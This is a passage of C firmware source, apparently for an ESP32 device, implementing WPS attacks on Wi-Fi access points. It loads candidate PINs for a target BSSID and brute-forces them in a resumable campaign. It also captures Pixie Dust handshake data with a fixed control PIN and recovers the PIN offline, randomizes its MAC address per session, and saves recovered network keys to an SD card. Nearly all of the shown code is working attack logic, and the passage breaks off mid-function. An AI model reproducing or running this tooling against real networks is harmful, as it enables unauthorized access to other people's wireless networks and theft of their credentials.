/* SPDX-FileCopyrightText: 2026 JanOS contributors */
/* SPDX-License-Identifier: Apache-2.0 */
#include "lab_workflows.h"

#include <stdio.h>
#include <string.h>

#include "wsc_fragment.h"
#include "wps_pin_algorithms.h"

#if defined(ESP_PLATFORM)
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lab_wps_session_esp.h"
#endif

#define LAB_WPS_DB_PATH "/sdcard/lab/wps_pin.bin"
#define LAB_WPS_RESULT_ROOT "/sdcard/lab/wps"
#define LAB_RADIO_SCRATCH_SIZE 24576U

static void secure_wipe(void *memory, size_t length)
{
    volatile unsigned char *bytes = memory;
    while (length--) *bytes++ = 0;
}

static void *pixie_cache_alloc(void *context, size_t size)
{
    return lab_platform_psram_alloc(context, size);
}

static void pixie_cache_free(void *context, void *memory, size_t size)
{
    (void)size;
    lab_platform_psram_free(context, memory);
}

static bool explicit_bssid(const uint8_t bssid[6])
{
    uint8_t any = 0;
    uint8_t all_ff = 0xff;
    if (!bssid || (bssid[0] & 1U)) return false;
    for (size_t index = 0; index < 6; ++index) {
        any |= bssid[index];
        all_ff &= bssid[index];
    }
    return any != 0 && all_ff != 0xff;
}

bool lab_workflows_cleanup_succeeded(const char *cleanup_result)
{
    return cleanup_result &&
           (strcmp(cleanup_result, "ok") == 0 ||
            strcmp(cleanup_result, "not_required") == 0);
}

static const char *session_result_name(wps_session_result_t result)
{
    switch (result) {
    case WPS_SESSION_SUCCESS: return "pin_and_m7_verified";
    case WPS_SESSION_PIN_REJECTED: return "pin_rejected";
    case WPS_SESSION_PRE_PIN_REJECTED: return "pre_pin_rejected";
    case WPS_SESSION_SETUP_LOCKED: return "setup_locked";
    case WPS_SESSION_TIMEOUT: return "timeout";
    case WPS_SESSION_IDENTITY_LOOP: return "identity_loop";
    case WPS_SESSION_DISCONNECTED: return "disconnected";
    default: return "session_fatal";
    }
}

static const char *session_diagnostic_name(wps_session_result_t result)
{
    switch (result) {
    case WPS_SESSION_SUCCESS: return "success";
    case WPS_SESSION_PIN_REJECTED: return "pin_rejected";
    case WPS_SESSION_PRE_PIN_REJECTED: return "pre_pin_rejected";
    case WPS_SESSION_SETUP_LOCKED: return "setup_locked";
    case WPS_SESSION_TIMEOUT: return "timeout";
    case WPS_SESSION_IDENTITY_LOOP: return "identity_loop";
    case WPS_SESSION_DISCONNECTED: return "disconnected";
    default: return "fatal";
    }
}

static const char *fatal_reason_name(lab_wps_fatal_reason_t reason)
{
    switch (reason) {
    case LAB_WPS_FATAL_NONE: return "none";
    case LAB_WPS_FATAL_INVALID_SEQUENCE: return "invalid_sequence";
    case LAB_WPS_FATAL_PIXIE_RECOVERY: return "pixie_recovery";
    case LAB_WPS_FATAL_PIN_INSTALL: return "pin_install";
    case LAB_WPS_FATAL_CREDENTIAL: return "credential";
    case LAB_WPS_FATAL_QUEUE_OVERFLOW: return "queue_overflow";
    case LAB_WPS_FATAL_CANCELLED: return "cancelled";
    case LAB_WPS_FATAL_UNEXPECTED_EVENT: return "unexpected_event";
    case LAB_WPS_FATAL_EVENT_LIMIT: return "event_limit";
    case LAB_WPS_FATAL_TARGET_NOT_FOUND: return "target_not_found";
    case LAB_WPS_FATAL_WPS_UNAVAILABLE: return "wps_unavailable";
    case LAB_WPS_FATAL_SCAN_START: return "scan_start";
    case LAB_WPS_FATAL_SCAN_RESULTS: return "scan_results";
    case LAB_WPS_FATAL_CALLBACK_INSTALL: return "callback_install";
    case LAB_WPS_FATAL_EVENT_HANDLER: return "event_handler";
    case LAB_WPS_FATAL_WIFI_CONFIG: return "wifi_config";
    case LAB_WPS_FATAL_CRYPTO_INIT: return "crypto_init";
    case LAB_WPS_FATAL_WIFI_CONNECT: return "wifi_connect";
    case LAB_WPS_FATAL_ADAPTER_MEMORY: return "adapter_memory";
    case LAB_WPS_FATAL_ADAPTER_SCRATCH: return "adapter_scratch";
    case LAB_WPS_FATAL_ADAPTER_QUEUE: return "adapter_queue";
    case LAB_WPS_FATAL_SESSION_INIT: return "session_init";
    case LAB_WPS_FATAL_SESSION_MAC: return "session_mac";
    case LAB_WPS_FATAL_RADIO_ACQUIRE: return "radio_acquire";
    case LAB_WPS_FATAL_RADIO_START: return "radio_start";
    default: return "unknown";
    }
}

static void emit_session_stage(lab_workflows_t *workflows,
                               uint32_t operation_id, const char *stage,
                               const lab_workflow_session_outcome_t *outcome)
{
    if (!workflows->emit || !stage || !outcome) return;
    char line[320];
    (void)snprintf(line, sizeof(line),
                   "{\"schema\":1,\"operation_id\":%u,\"type\":\"wps_stage\","
                   "\"stage\":\"%s\",\"started\":%s,"
                   "\"session_result\":\"%s\",\"cleanup_result\":\"%s\","
                   "\"dropped_events\":%u,\"coalesced_m3\":%u,"
                   "\"fatal_reason\":\"%s\"}",
                   (unsigned)operation_id, stage,
                   outcome->started ? "true" : "false",
                   session_diagnostic_name(outcome->result.session_result),
                   outcome->cleanup_ok ? "ok" : "failed",
                   outcome->result.dropped_events,
                   outcome->result.coalesced_m3,
                   fatal_reason_name(outcome->result.fatal_reason));
    workflows->emit(workflows->emit_context, line);
    secure_wipe(line, sizeof(line));
}

static void emit_pixie_result(lab_workflows_t *workflows,
                              uint32_t operation_id, bool ok,
                              const pixie_result_t *found)
{
    if (!workflows->emit || !found) return;
    char line[224];
    (void)snprintf(line, sizeof(line),
                   "{\"schema\":1,\"operation_id\":%u,\"type\":\"wps_stage\","
                   "\"stage\":\"pixie_done\",\"ok\":%s,\"found\":%s,"
                   "\"partial\":%s,\"cancelled\":%s,\"mode\":%u,"
                   "\"checks\":%u}",
                   (unsigned)operation_id, ok ? "true" : "false",
                   found->found ? "true" : "false",
                   found->partial ? "true" : "false",
                   found->cancelled ? "true" : "false",
                   (unsigned)found->mode,
                   (unsigned)found->commitment_checks);
    workflows->emit(workflows->emit_context, line);
    secure_wipe(line, sizeof(line));
}

static void emit_simple_stage(lab_workflows_t *workflows,
                              uint32_t operation_id, const char *stage)
{
    if (!workflows->emit || !stage) return;
    char line[128];
    (void)snprintf(line, sizeof(line),
                   "{\"schema\":1,\"operation_id\":%lu,\"type\":\"wps_stage\","
                   "\"stage\":\"%s\"}",
                   (unsigned long)operation_id, stage);
    workflows->emit(workflows->emit_context, line);
    secure_wipe(line, sizeof(line));
}

static const char *candidate_source_name(wps_pin_source_t source)
{
    static const char *const names[] = {
        "explicit", "model", "oui_static", "oui_algo",
        "ssid", "vendor", "broad", "common",
    };
    return (unsigned)source < sizeof(names) / sizeof(names[0])
               ? names[source] : "unknown";
}

static void emit_plan(lab_workflows_t *workflows,
                      const lab_command_t *command,
                      const wps_pin_candidate_t *candidates, size_t count)
{
    if (!workflows->emit) return;
    char line[192];
    (void)snprintf(line, sizeof(line),
                   "{\"schema\":1,\"type\":\"%s\",\"count\":%u,"
                   "\"unsupported\":%u,\"duplicates\":%u,\"truncated\":%s}",
                   command->kind == LAB_COMMAND_JWPS_PLAN ? "jwps_plan" :
                                                            "campaign_plan",
                   (unsigned)count,
                   (unsigned)workflows->query_stats.unsupported_algorithms,
                   (unsigned)workflows->query_stats.duplicates_removed,
                   workflows->query_stats.truncated ? "true" : "false");
    workflows->emit(workflows->emit_context, line);
    for (size_t index = 0; index < count; ++index) {
        (void)snprintf(line, sizeof(line),
                       "SENSITIVE {\"candidate\":%u,\"pin\":\"%08u\","
                       "\"source\":\"%s\",\"detail\":%u}",
                       (unsigned)index, (unsigned)candidates[index].pin8,
                       candidate_source_name(candidates[index].source),
                       (unsigned)candidates[index].detail_id);
        workflows->emit(workflows->emit_context, line);
    }
    secure_wipe(line, sizeof(line));
}

bool lab_workflows_poll_cancel(lab_workflows_t *workflows)
{
    if (!workflows) return false;
    bool requested = lab_platform_poll_cancel(workflows->platform);
    if (requested && workflows->radio && workflows->radio->owner_token != 0)
        lab_radio_cancel(workflows->radio, workflows->radio->owner_token);
    return requested ||
           (workflows->radio && workflows->radio->owner_token != 0 &&
            lab_radio_cancel_requested(workflows->radio,
                                       workflows->radio->owner_token));
}

static bool workflow_cancel_callback(void *context)
{
    return lab_workflows_poll_cancel((lab_workflows_t *)context);
}

#if defined(ESP_PLATFORM)
static bool workflow_commit_callback(void *context, uint32_t operation_id)
{
    lab_workflows_t *workflows = context;
    return workflows && lab_platform_commit_gate(workflows->platform,
                                                  operation_id);
}
#endif

static void workflow_yield_callback(void *context)
{
    (void)context;
#if defined(ESP_PLATFORM)
    vTaskDelay(1);
#endif
}

static bool workflow_retry_delay(lab_workflows_t *workflows,
                                 unsigned delay_ms)
{
    enum { SLICE_MS = 50 };
    unsigned elapsed = 0;
    do {
        if (lab_workflows_poll_cancel(workflows)) return false;
#if defined(ESP_PLATFORM)
        unsigned remaining = delay_ms - elapsed;
        unsigned slice = remaining < SLICE_MS ? remaining : SLICE_MS;
        vTaskDelay(pdMS_TO_TICKS(slice));
        elapsed += slice;
#else
        elapsed = delay_ms;
#endif
    } while (elapsed < delay_ms);
    return !lab_workflows_poll_cancel(workflows);
}

static bool store_authenticated_secret(lab_secret_vault_t *vault,
                                       const char pin[9],
                                       const lab_wps_result_t *result,
                                       uint32_t operation_id,
                                       uint64_t now_ms)
{
    char key[LAB_WPS_NETWORK_KEY_MAX + 1U] = {0};
    bool valid = vault && result && result->session_result == WPS_SESSION_SUCCESS &&
                 result->credential_present && result->network_key_len > 0U &&
                 result->network_key_len <= LAB_WPS_NETWORK_KEY_MAX &&
                 memchr(result->network_key, 0, result->network_key_len) == NULL;
    if (valid) {
        memcpy(key, result->network_key, result->network_key_len);
        valid = lab_secret_store(vault, pin, key, operation_id, now_ms);
    }
    secure_wipe(key, sizeof(key));
    return valid;
}

static void remember_identity(lab_workflows_t *workflows,
                              const lab_wps_result_t *result)
{
    if (workflows && result) workflows->last_identity = result->identity;
}

static void persist_success(lab_workflows_t *workflows,
                            const lab_command_t *command,
                            const char pin[9],
                            const lab_wps_result_t *result,
                            uint32_t operation_id,
                            const char *source)
{
    if (!workflows->ops->store_success) return;
    if (lab_workflows_poll_cancel(workflows)) {
        workflows->storage_result = "cancelled";
        return;
    }
    if (lab_platform_sd_mount(workflows->platform) != LAB_PLATFORM_OK) {
        workflows->storage_result = "mount_error";
        return;
    }
    lab_result_record_t record = {
        .ssid = result->ssid[0] ? result->ssid : command->ssid,
        .pin = pin,
        .network_key = result->network_key,
        .network_key_len = result->network_key_len,
        .recovery_source = source,
        .manufacturer = result->identity.manufacturer,
        .model_name = result->identity.model_name,
        .model_number = result->identity.model_number,
        .device_name = result->identity.device_name,
        .operation_id = operation_id,
        .authenticated_m7 = result->session_result == WPS_SESSION_SUCCESS &&
                            result->credential_present,
    };
    memcpy(record.bssid, command->bssid, sizeof(record.bssid));
    lab_store_status_t status = workflows->ops->store_success(
        workflows->ops_context, &record);
    workflows->storage_result = lab_store_status_name(status);
    if (lab_platform_sd_unmount(workflows->platform) != LAB_PLATFORM_OK)
        workflows->storage_result = "unmount_error";
}

static void persist_observation(lab_workflows_t *workflows,
                                const lab_command_t *command,
                                const char *reason)
{
    if (!workflows->ops->store_observation || !reason) return;
    if (lab_platform_sd_mount(workflows->platform) != LAB_PLATFORM_OK) {
        workflows->storage_result = "mount_error";
        return;
    }
    lab_device_observation_t observation = {
        .ssid = command->ssid,
        .stage = "wps_session",
        .reason = reason,
        .manufacturer = workflows->last_identity.manufacturer,
        .model_name = workflows->last_identity.model_name,
        .device_name = workflows->last_identity.device_name,
    };
    memcpy(observation.bssid, command->bssid, sizeof(observation.bssid));
    lab_store_status_t status = workflows->ops->store_observation(
        workflows->ops_context, &observation);
    workflows->storage_result = lab_store_status_name(status);
    if (lab_platform_sd_unmount(workflows->platform) != LAB_PLATFORM_OK)
        workflows->storage_result = "unmount_error";
}

#if defined(ESP_PLATFORM)
static void *db_alloc(size_t bytes, void *context)
{
    return lab_platform_psram_alloc((lab_platform_t *)context, bytes);
}

static void db_free(void *memory, void *context)
{
    lab_platform_psram_free((lab_platform_t *)context, memory);
}

static size_t real_load_candidates(void *context, const uint8_t bssid[6],
                                   const char *ssid,
                                   wps_pin_candidate_t *output, size_t capacity,
                                   wps_pin_query_stats_t *stats,
                                   wps_pin_db_result_t *result)
{
    lab_workflows_t *workflows = context;
    memset(stats, 0, sizeof(*stats));
    wps_pin_db_t *db = wps_pin_db_open(LAB_WPS_DB_PATH, db_alloc, db_free,
                                       workflows->platform, result);
    if (!db) return 0;
    size_t count = wps_pin_db_candidates(db, bssid, ssid, NULL, NULL, NULL,
                                         output, capacity, stats);
    wps_pin_db_close(db);
    return count;
}

static bool make_session_mac(lab_workflows_t *workflows, uint8_t output[6])
{
    if (workflows && workflows->reuse_previous_session_mac) {
        memcpy(output, workflows->previous_session_mac, 6);
        return true;
    }
    if (!workflows || !workflows->platform || !workflows->platform->ops ||
        !workflows->platform->ops->entropy) return false;
    for (unsigned attempt = 0; attempt < 8; ++attempt) {
        if (workflows->platform->ops->entropy(workflows->platform->context,
                                              output, 6) != 0) return false;
        output[0] = (uint8_t)((output[0] | 2U) & 0xfeU);
        bool different_boot = memcmp(output, workflows->radio->effective_boot_mac, 6) != 0;
        bool different_previous = memcmp(output, workflows->previous_session_mac, 6) != 0;
        if (different_boot && different_previous) {
            memcpy(workflows->previous_session_mac, output, 6);
            return true;
        }
    }
    secure_wipe(output, 6);
    return false;
}

static bool radio_cancelled(void *context)
{
    return lab_workflows_poll_cancel(context);
}

static lab_workflow_session_outcome_t real_session(
    lab_workflows_t *workflows, const uint8_t bssid[6], const char *pin,
    pixie_bundle_t *bundle)
{
    lab_workflow_session_outcome_t outcome = {.cleanup_ok = true};
    uint8_t session_mac[6] = {0};
    uint32_t owner = 0;
    lab_wps_esp_session_t *adapter = NULL;
    lab_wps_session_t session;
    lab_wps_request_t request = {
        .pin = pin,
        .pin_len = pin ? strlen(pin) : 0,
        .cancelled = radio_cancelled,
        .cancel_context = workflows,
    };
    memcpy(request.bssid, bssid, 6);
    outcome.result.session_result = WPS_SESSION_FATAL;

    if (!make_session_mac(workflows, session_mac)) {
        outcome.result.fatal_reason = LAB_WPS_FATAL_SESSION_MAC;
        goto cleanup;
    }
    if (!lab_radio_acquire(workflows->radio, session_mac,
                           LAB_RADIO_SCRATCH_SIZE, &owner)) {
        outcome.result.fatal_reason = LAB_WPS_FATAL_RADIO_ACQUIRE;
        goto cleanup;
    }
    if (!lab_radio_mark_running(workflows->radio, owner)) {
        outcome.result.fatal_reason = LAB_WPS_FATAL_RADIO_START;
        goto cleanup;
    }
    outcome.started = true;
    if (!lab_wps_esp_session_open(&adapter, &session, workflows->radio, owner,
                                  &request, bundle != NULL,
                                  &outcome.result.fatal_reason)) goto cleanup;
    if (bundle)
        (void)lab_wps_capture_pixie(&session, &request, bundle, &outcome.result);
    else
        (void)lab_wps_verify_pin(&session, &request, &outcome.result);
    outcome.result.coalesced_m3 = lab_wps_esp_session_coalesced_m3(adapter);

cleanup:
    if (workflows->radio && workflows->radio->owner_token != 0)
        lab_radio_cancel(workflows->radio, workflows->radio->owner_token);
    bool adapter_cleanup_ok = lab_wps_esp_session_close(adapter);
    if (workflows->radio && lab_radio_is_quarantined(workflows->radio))
        adapter_cleanup_ok = false;
    if (workflows->radio && workflows->radio->owner_token != 0) {
        lab_radio_result_t released = lab_radio_release(
            workflows->radio, (int)outcome.result.session_result);
        outcome.cleanup_ok = adapter_cleanup_ok && released.cleanup_ok;
        outcome.quarantined = released.quarantined || !adapter_cleanup_ok;
        if (!adapter_cleanup_ok) lab_radio_quarantine(workflows->radio);
    } else {
        outcome.cleanup_ok = adapter_cleanup_ok;
        outcome.quarantined = workflows->radio &&
                              lab_radio_is_quarantined(workflows->radio);
    }
    secure_wipe(session_mac, sizeof(session_mac));
    return outcome;
}

static lab_workflow_session_outcome_t real_verify(
    void *context, const uint8_t bssid[6], const char pin[9])
{
    return real_session(context, bssid, pin, NULL);
}

static lab_workflow_session_outcome_t real_capture(
    void *context, const uint8_t bssid[6], pixie_bundle_t *bundle)
{
    static const char control_pin[] = "12345670";
    return real_session(context, bssid, control_pin, bundle);
}

static bool real_recover(void *context, const pixie_bundle_t *bundle,
                         const pixie_options_t *options, pixie_result_t *result)
{
    (void)context;
    return pixie_recover(bundle, options, result);
}

static size_t fragment_frame(uint8_t *out, uint8_t id, uint8_t flags,
                             uint16_t total, const uint8_t *payload,
                             size_t payload_length)
{
    size_t header = (flags & WSC_FLAG_LENGTH_FIELD) ? 20U : 18U;
    size_t length = header + payload_length;
    memset(out, 0, length);
    out[0] = 1; out[2] = (uint8_t)((length - 4U) >> 8U);
    out[3] = (uint8_t)(length - 4U); out[4] = 1; out[5] = id;
    out[6] = out[2]; out[7] = out[3]; out[8] = 254;
    out[10] = 0x37; out[11] = 0x2a; out[15] = 1; out[16] = 4;
    out[17] = flags;
    if (flags & WSC_FLAG_LENGTH_FIELD) {
        out[18] = (uint8_t)(total >> 8U); out[19] = (uint8_t)total;
    }
    memcpy(out + header, payload, payload_length);
    return length;
}

static bool selftest_fragment(lab_workflows_t *workflows)
{
    uint8_t *storage = lab_platform_psram_alloc(workflows->platform, 2048U);
    if (!storage) return false;
    const uint8_t first[] = {0x10, 0x22, 0, 1, 4};
    const uint8_t second[] = {0x10, 0x4a, 0, 1, 0x10};
    const uint8_t expected[] = {0x10, 0x22, 0, 1, 4,
                                0x10, 0x4a, 0, 1, 0x10};
    uint8_t frame[64], ack[18];
    wsc_reassembly_t state;
    wsc_fragment_view_t view;
    wsc_reassembly_init(&state, storage, 2048U, 1000U);
    size_t length = fragment_frame(frame, 10, 3, sizeof(expected), first,
                                   sizeof(first));
    bool ok = wsc_reassembly_accept(&state, frame, length, 100U, &view) ==
                  WSC_FRAGMENT_NEED_ACK &&
              wsc_build_fragment_ack(10, ack, sizeof(ack)) == sizeof(ack);
    length = fragment_frame(frame, 11, 0, 0, second, sizeof(second));
    ok = ok && wsc_reassembly_accept(&state, frame, length, 200U, &view) ==
                   WSC_FRAGMENT_COMPLETE &&
         view.length == sizeof(expected) &&
         memcmp(view.payload, expected, sizeof(expected)) == 0;
    secure_wipe(storage, 2048U);
    lab_platform_psram_free(workflows->platform, storage);
    return ok;
}

static bool selftest_transport(lab_workflows_t *workflows)
{
    uint8_t session_mac[6];
    uint32_t owner = 0;
    if (!make_session_mac(workflows, session_mac) ||
        !lab_radio_acquire(workflows->radio, session_mac, 64U, &owner) ||
        !lab_radio_mark_running(workflows->radio, owner)) {
        secure_wipe(session_mac, sizeof(session_mac));
        return false;
    }
    lab_radio_result_t released = lab_radio_release(workflows->radio, 0);
    secure_wipe(session_mac, sizeof(session_mac));
    return released.cleanup_ok && !released.quarantined;
}

static bool selftest_db(lab_workflows_t *workflows)
{
    static const uint8_t sample[6] = {0x68, 0xff, 0x7b, 0xcd, 0xfc, 0x40};
    wps_pin_candidate_t *sets = lab_platform_psram_alloc(
        workflows->platform, 2U * WPS_PIN_CANDIDATE_MAX * sizeof(*sets));
    if (!sets) return false;
    wps_pin_query_stats_t a_stats, b_stats;
    wps_pin_db_result_t a_result, b_result;
    size_t a = real_load_candidates(workflows, sample, NULL, sets,
                                    WPS_PIN_CANDIDATE_MAX, &a_stats, &a_result);
    size_t b = real_load_candidates(workflows, sample, NULL,
                                    sets + WPS_PIN_CANDIDATE_MAX,
                                    WPS_PIN_CANDIDATE_MAX, &b_stats, &b_result);
    bool ok = a_result == WPS_PIN_DB_OK && b_result == WPS_PIN_DB_OK && a == b &&
              memcmp(&a_stats, &b_stats, sizeof(a_stats)) == 0 &&
              memcmp(sets, sets + WPS_PIN_CANDIDATE_MAX,
                     a * sizeof(*sets)) == 0;
    secure_wipe(sets, 2U * WPS_PIN_CANDIDATE_MAX * sizeof(*sets));
    lab_platform_psram_free(workflows->platform, sets);
    return ok;
}

static bool selftest_pixie(lab_workflows_t *workflows)
{
    pixie_bundle_t bundle;
    pixie_result_t result;
    memset(&bundle, 0, sizeof(bundle));
    memset(bundle.authkey, 0x11, sizeof(bundle.authkey));
    memset(bundle.pke, 0x22, sizeof(bundle.pke));
    memset(bundle.pkr, 0x33, sizeof(bundle.pkr));
    memset(bundle.e_nonce, 0x44, sizeof(bundle.e_nonce));
    static const uint8_t hash1[32] = {
        0xb3,0x1d,0xec,0x12,0x52,0x90,0xad,0x93,0x3c,0x08,0x43,0x3e,0xe5,0x44,0x8b,0x6b,
        0x7e,0x9c,0x80,0xbc,0x15,0x74,0x57,0x66,0x7b,0xbc,0xb6,0xf3,0xb3,0x83,0xb8,0xdf};
    static const uint8_t hash2[32] = {
        0x00,0x29,0x88,0x84,0x38,0x66,0x48,0x99,0xe3,0x47,0x00,0x60,0xc5,0x35,0x62,0xe9,
        0x32,0x43,0xdd,0xdd,0xd4,0x11,0x3b,0xca,0x02,0x7f,0x5e,0xb9,0x7c,0xbf,0xbf,0xfe};
    memcpy(bundle.e_hash1, hash1, sizeof(hash1));
    memcpy(bundle.e_hash2, hash2, sizeof(hash2));
    const pixie_options_t options = {.modes = PIXIE_MODE_NULL_SECRET,
                                     .yield_every = 128U,
                                     .cache_alloc = pixie_cache_alloc,
                                     .cache_free = pixie_cache_free,
                                     .cache_context = workflows->platform};
    bool ok = pixie_recover(&bundle, &options, &result) && result.found &&
              strcmp(result.pin, "12345670") == 0;
    secure_wipe(&bundle, sizeof(bundle));
    secure_wipe(&result, sizeof(result));
    return ok;
}

static bool real_selftest(void *context, lab_command_kind_t kind)
{
    lab_workflows_t *workflows = context;
    bool mounted = false;
    bool ok = false;
    if (kind == LAB_COMMAND_SELFTEST_DB) {
        mounted = lab_platform_sd_mount(workflows->platform) == LAB_PLATFORM_OK;
        ok = mounted && selftest_db(workflows);
        if (mounted && lab_platform_sd_unmount(workflows->platform) != LAB_PLATFORM_OK)
            ok = false;
    } else if (kind == LAB_COMMAND_SELFTEST_FRAGMENT) {
        ok = selftest_fragment(workflows);
    } else if (kind == LAB_COMMAND_SELFTEST_TRANSPORT) {
        ok = selftest_transport(workflows);
    } else if (kind == LAB_COMMAND_SELFTEST_PIXIE) {
        ok = selftest_pixie(workflows);
    }
    return ok;
}

static lab_store_status_t real_store_success(
    void *context, const lab_result_record_t *record)
{
    lab_workflows_t *workflows = context;
    return lab_result_store_success_gated(
        LAB_WPS_RESULT_ROOT, record, workflow_commit_callback, workflows,
        NULL, NULL);
}

static lab_store_status_t real_store_observation(
    void *context, const lab_device_observation_t *observation)
{
    (void)context;
    return lab_result_store_observation(LAB_WPS_RESULT_ROOT, observation);
}

static const lab_workflow_ops_t real_ops = {
    .load_candidates = real_load_candidates,
    .verify_pin = real_verify,
    .capture_pixie = real_capture,
    .recover_pixie = real_recover,
    .selftest = real_selftest,
    .store_success = real_store_success,
    .store_observation = real_store_observation,
};
#endif

bool lab_workflows_init_with_ops(lab_workflows_t *workflows,
                                 lab_platform_t *platform, lab_radio_t *radio,
                                 const lab_workflow_ops_t *ops,
                                 void *ops_context)
{
    if (!workflows || !platform || !ops || !ops->load_candidates ||
        !ops->verify_pin || !ops->capture_pixie || !ops->recover_pixie ||
        !ops->selftest) return false;
    memset(workflows, 0, sizeof(*workflows));
    workflows->platform = platform;
    workflows->radio = radio;
    workflows->ops = ops;
    workflows->ops_context = ops_context;
    workflows->storage_result = "not_required";
    return true;
}

bool lab_workflows_init(lab_workflows_t *workflows,
                        lab_platform_t *platform, lab_radio_t *radio)
{
#if defined(ESP_PLATFORM)
    if (!radio) return false;
    return lab_workflows_init_with_ops(workflows, platform, radio, &real_ops,
                                       workflows);
#else
    (void)workflows; (void)platform; (void)radio;
    return false;
#endif
}

void lab_workflows_set_emitter(lab_workflows_t *workflows,
                               lab_workflow_emit_fn emit,
                               void *emit_context)
{
    if (!workflows) return;
    workflows->emit = emit;
    workflows->emit_context = emit_context;
}

static bool load_plan(lab_workflows_t *workflows, const lab_command_t *command,
                      wps_pin_candidate_t **candidates, size_t *count,
                      const char **result, const char **cleanup)
{
    *candidates = NULL;
    *count = 0;
    *cleanup = "not_required";
    if (lab_platform_sd_mount(workflows->platform) != LAB_PLATFORM_OK) {
        *result = "sd_mount_error";
        return false;
    }
    wps_pin_candidate_t *memory = lab_platform_psram_alloc(
        workflows->platform, WPS_PIN_CANDIDATE_MAX * sizeof(*memory));
    if (!memory) {
        *result = "no_psram";
    } else {
        wps_pin_db_result_t db_result = WPS_PIN_DB_IO_ERROR;
        const char *ssid = command->ssid[0] ? command->ssid : NULL;
        *count = workflows->ops->load_candidates(
            workflows->ops_context, command->bssid, ssid, memory,
            WPS_PIN_CANDIDATE_MAX, &workflows->query_stats, &db_result);
        if (db_result == WPS_PIN_DB_OK) {
            *candidates = memory;
            memory = NULL;
            emit_plan(workflows, command, *candidates, *count);
        } else {
            *result = "db_error";
        }
    }
    if (memory) {
        secure_wipe(memory, WPS_PIN_CANDIDATE_MAX * sizeof(*memory));
        lab_platform_psram_free(workflows->platform, memory);
    }
    if (lab_platform_sd_unmount(workflows->platform) != LAB_PLATFORM_OK) {
        *cleanup = "failed";
        if (*candidates) {
            secure_wipe(*candidates, WPS_PIN_CANDIDATE_MAX * sizeof(**candidates));
            lab_platform_psram_free(workflows->platform, *candidates);
            *candidates = NULL;
            *count = 0;
        }
        *result = "sd_unmount_error";
        return false;
    }
    *cleanup = "ok";
    return *candidates != NULL;
}

static bool verified_secret(lab_workflows_t *workflows,
                            const lab_command_t *command,
                            const char pin[9], uint32_t operation_id,
                            lab_secret_vault_t *vault,
                            const char **result, const char **cleanup)
{
    lab_workflow_session_outcome_t outcome = workflows->ops->verify_pin(
        workflows->ops_context, command->bssid, pin);
    remember_identity(workflows, &outcome.result);
    *cleanup = outcome.cleanup_ok ? "ok" : "failed";
    *result = session_result_name(outcome.result.session_result);
    if (outcome.result.cancelled) {
        *result = "cancelled";
        lab_secret_erase(vault);
    } else if (outcome.result.session_result == WPS_SESSION_SUCCESS &&
               outcome.cleanup_ok) {
        if (!store_authenticated_secret(vault, pin, &outcome.result,
                                        operation_id,
                                        lab_platform_now_ms(workflows->platform))) {
            *result = "credential_missing";
        } else {
            persist_success(workflows, command, pin, &outcome.result,
                            operation_id, "explicit_pin");
        }
    }
    secure_wipe(&outcome.result, sizeof(outcome.result));
    return true;
}

typedef struct {
    lab_workflows_t *workflows;
    const lab_command_t *command;
    wps_pin_candidate_t *candidates;
    lab_secret_vault_t *vault;
    uint32_t operation_id;
    bool cleanup_ok;
    bool cancelled;
    wps_session_result_t actual_result;
} campaign_context_t;

static wps_session_result_t attempt_candidate(unsigned index, void *opaque)
{
    campaign_context_t *context = opaque;
    char pin[9] = {0};
    if (!wps_pin_format(context->candidates[index].pin8, pin))
        return WPS_SESSION_FATAL;
    lab_workflow_session_outcome_t outcome = context->workflows->ops->verify_pin(
        context->workflows->ops_context, context->command->bssid, pin);
    context->cleanup_ok = outcome.cleanup_ok;
    context->cancelled = outcome.result.cancelled;
    context->actual_result = outcome.result.session_result;
    remember_identity(context->workflows, &outcome.result);
    if (outcome.result.cancelled)
        lab_secret_erase(context->vault);
    else if (outcome.cleanup_ok &&
             outcome.result.session_result == WPS_SESSION_SUCCESS) {
        bool stored = store_authenticated_secret(
            context->vault, pin, &outcome.result, context->operation_id,
            lab_platform_now_ms(context->workflows->platform));
        if (stored)
            persist_success(context->workflows, context->command, pin,
                            &outcome.result, context->operation_id,
                            candidate_source_name(
                                context->candidates[index].source));
    }
    secure_wipe(&outcome.result, sizeof(outcome.result));
    secure_wipe(pin, sizeof(pin));
    return context->cleanup_ok ? context->actual_result : WPS_SESSION_FATAL;
}

static bool execute_campaign(lab_workflows_t *workflows,
                             const lab_command_t *command,
                             uint32_t operation_id,
                             lab_secret_vault_t *vault,
                             const char **result, const char **cleanup)
{
    wps_pin_candidate_t *candidates = NULL;
    size_t count = 0;
    if (!load_plan(workflows, command, &candidates, &count, result, cleanup))
        return true;
    workflows->candidate_count = (unsigned)count;
    if (command->start_index >= count) {
        *result = "start_out_of_range";
        goto done;
    }
    campaign_context_t context = {
        .workflows = workflows, .command = command, .candidates = candidates,
        .vault = vault, .operation_id = operation_id, .cleanup_ok = true,
        .actual_result = WPS_SESSION_FATAL, .cancelled = false,
    };
    campaign_run_result_t run = campaign_run(
        command->start_index, command->count, (unsigned)count,
        attempt_candidate, &context);
    workflows->attempt_count = run.attempt_count;
    workflows->resume_index = context.cleanup_ok ? run.resume_index : command->start_index;
    *cleanup = context.cleanup_ok ? "ok" : "failed";
    if (context.cancelled) {
        *result = "cancelled";
    } else if (!context.cleanup_ok) {
        *result = session_result_name(context.actual_result);
    } else if (run.decision == CAMPAIGN_DECISION_SUCCESS) {
        lab_secret_info_t secret = lab_secret_status(
            vault, lab_platform_now_ms(workflows->platform));
        *result = secret.state == LAB_SECRET_AVAILABLE ?
                      "pin_and_m7_verified" : "credential_missing";
    } else if (run.decision == CAMPAIGN_DECISION_EXHAUSTED) {
        *result = "candidate_budget_exhausted";
    } else if (run.decision == CAMPAIGN_DECISION_LOCKED) {
        *result = "setup_locked";
    } else if (run.decision == CAMPAIGN_DECISION_PAUSE) {
        *result = "campaign_paused";
    } else {
        *result = "campaign_fatal";
    }
done:
    secure_wipe(candidates, WPS_PIN_CANDIDATE_MAX * sizeof(*candidates));
    lab_platform_psram_free(workflows->platform, candidates);
    return true;
}

static bool execute_pixie(lab_workflows_t *workflows,
                          const lab_command_t *command,
                          uint32_t operation_id,
                          lab_secret_vault_t *vault,
                          const char **result, const char **cleanup)
{
    enum { PIXIE_VERIFY_ATTEMPTS = 3 };
    pixie_bundle_t bundle;
    pixie_result_t found;
    lab_workflow_session_outcome_t session;
    bool search_ok = false;
    memset(&bundle, 0, sizeof(bundle));
    memset(&found, 0, sizeof(found));
    memset(&session, 0, sizeof(session));
    workflows->reuse_previous_session_mac = false;
    if (command->epoch_set &&
